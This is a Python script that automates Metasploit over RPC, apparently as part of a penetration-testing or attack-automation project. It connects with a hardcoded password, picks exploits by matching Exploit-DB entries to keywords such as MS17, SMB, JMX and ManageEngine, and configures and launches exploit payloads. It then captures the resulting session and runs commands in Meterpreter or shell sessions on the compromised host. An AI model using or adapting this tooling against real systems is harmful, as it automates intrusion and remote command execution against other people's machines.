from pymetasploit3.msfrpc import MsfRpcClient, MsfConsole
import time
import jellyfish
import pdb


def main_connection():
    # ip = "127.0.0.1"
    # user = "msf"
    passwd = '1234LOL'
    try:
        client = MsfRpcClient(passwd, port=55552)
        console = MsfConsole(client)
        print(client)
    except:
        client = -1
        console = -1
    return client, console


def main_display_exploit(client):
    list_of_exploit = client.modules.exploits
    return list_of_exploit


def main_display_auxiliary(client):
    list_of_auxiliary = client.modules.auxiliary
    return list_of_auxiliary


def main_run_exploit(chosen_exploit, client):
    try:
        exploit = client.modules.use('exploit', chosen_exploit)
        return exploit
    except:
        return -1


def main_run_auxiliary(chosen_auxiliary, client):
    try:
        auxiliary = client.modules.use('auxiliary', chosen_auxiliary)
        return auxiliary
    except:
        return -1


def main_change_option_exploit(choosen_option, arg, type_val, exploit):
    try:
        if type_val == "INT":
            arg = int(arg)
        elif type_val == "BOOL":
            arg = bool(arg)
        else:
            exploit[choosen_option] = arg

        exploit[choosen_option] = arg

        return exploit.runoptions

    except:
        return -1


def main_change_option_auxiliary(choosen_option, arg, type_val, auxiliary):
    try:
        if type_val == "INT":
            arg = int(arg)
        elif type_val == "BOOL":
            arg = bool(arg)
        else:
            auxiliary[choosen_option] = arg

        auxiliary[choosen_option] = arg

        return auxiliary.runoptions

    except:
        return -1


def main_see_payload(exploit):
    return exploit.targetpayloads()


def main_choose_payload(chosen_payload, client):
    try:
        payload = client.modules.use('payload', chosen_payload)
        return payload
    except:
        return -1


def main_config_payload(chosen_option, val, type_val, payload):
    try:
        if type_val == "INT":
            val = int(val)
        elif type_val == "BOOL":
            val = bool(val)
        else:
            payload.runoptions[chosen_option] = val

        payload.runoptions[chosen_option] = val

        return payload.runoptions
    except:
        return -1


def main_exe_exploit(payload, exploit, client):
    # print(payload.runoptions)
    # print(exploit.runoptions)
    # import pdb
    # pdb.set_trace()
    print(client)
    json_exploit = exploit.execute(payload=payload)
    time.sleep(15)
    # print(client.sessions.list)
    try:

        session_num_list = [*client.sessions.list]
        # print(session_num_list)
        session_id = session_num_list[-1]
        session = client.sessions.session(str(session_id))
        return json_exploit, session
    except:
        return -1, -1


def main_enter_console_for_scan(auxiliary, ip, console):
    # import pdb
    # pdb.set_trace()
    try:
        console.write('use ' + auxiliary)
        console.write('set RHOSTS ' + ip)
        console.write('run')
        time.sleep(5)
        return console.read()
    except:
        return -1


def main_exe_auxiliary(auxiliary, client):
    json_auxiliary = auxiliary.execute()
    time.sleep(15)
    try:

        session_num_list = [*client.sessions.list]
        session_id = session_num_list[-1]
        session = client.sessions.session(str(session_id))
        return json_auxiliary, session
    except:
        return -1, -1


def main_run_prompt(cmd, session):
    if "Meterpreter" in str(type(session)):
        terminating_strs = ['----END----']
        return session.run_with_output(cmd, terminating_strs, timeout=10, timeout_exception=False)
    # 10 seconds max

    elif "Shell" in str(type(session)):
        session.write(cmd)
        return session.read()


def main_enter_console_manual(list_of_string, console):
    for string in list_of_string:
        console.write(string)
        while console.is_busy():
            time.sleep(1)
    return 0


def retrieve_exploit_from_db_info(list_of_rows, client):
    '''

    @param list_of_rows: list of the row extracted from exploitdb after a research
    @param client: rpc metasploit client
    @return: possible exploit according to the database of exploitdb
    '''
    # define keyword global
    keyword_global = ['SMB', 'smb', 'Smb']  # 'Windows', 'windows', 'WINDOWS', 'Server', 'SERVER', 'server',
    keyword_special = ['ms17', 'Ms17', 'MS17', 'JMX', 'jmx', 'Jmx', 'RMI', 'rmi', 'Rmi', "manageengine", "MANAGEENGINE",
                       "ManageEngine"]

    # pdb.set_trace()
    # define data row's container
    ## variables of the row
    row_data = {}
    global_keyword_list = []
    special_keyword_list = []

    ## variables of the rows
    id_row = 1
    rows_data = {}

    # create the dictionary of the rows
    # seek word key global and special in rows' data and store it
    for row in list_of_rows:
        for item in row:
            for keyword in keyword_global:
                if keyword in item:
                    global_keyword_list.append(keyword)
            for keyword in keyword_special:
                if keyword in item:
                    special_keyword_list.append(keyword)

            # pdb.set_trace()

            if len(special_keyword_list) != 0:
                row_data['global'] = global_keyword_list
                row_data['special'] = special_keyword_list
                rows_data[str(id_row)] = row_data

                # reset variable of the row
                row_data = {}
                global_keyword_list = []
                special_keyword_list = []

            # increment the id_row
            id_row = id_row + 1

    # pdb.set_trace()
    # if nothing is found ...
    if len(rows_data) == 0:
        return -1

    # seek the relative exploit for each row (forged on rows_data)

    # create new list
    new_list = []
    end_list = []
    # miles_dist = []
    exploits_chosen = []

    # generate list_of exploit
    list_of_exploit = main_display_exploit(client)


    for row in rows_data.items():
        # first search with the global to reduce the loss of time (cause we are going to use damerau levenshtein distance's algorithm after)
        for keyword in row[1]["global"]:
            for exploit in list_of_exploit:
                if keyword.lower() in exploit and exploit not in new_list:
                    new_list.append(exploit)
    #pdb.set_trace()

    #if no global was set, new_list is empty !!!!!!
    if len(new_list) == 0:
        new_list = list_of_exploit

    # then search special keyword
    for row in rows_data.items():
        for keyword in row[1]["special"]:
            for remaining in new_list:
                    if keyword.lower() in remaining and remaining not in end_list:
                        end_list.append(remaining)

    # calculate damerau_levenshtein
    # new_word = remaining.split('/')[-1]
    # dist = jellyfish.damerau_levenshtein_distance(keyword.lower(), new_word)
    # if dist == len(new_word):
    #     # affect a value so this exploit would never be chosen
    #     dist = 1000
    # miles_dist.append(dist)
    # pdb.set_trace()
    # index = miles_dist.index(min(miles_dist))
    # exploits_chosen.append(new_list[index])
    exploits_chosen = end_list

    return exploits_chosen


client, console = main_connection()

print(retrieve_exploit_from_db_info([['2015-02-17', 'Java JMX - Server Insecure Configuration Java Code Execution (Metasploit)', 'remote', 'Java', 'Metasploit']]
,client))
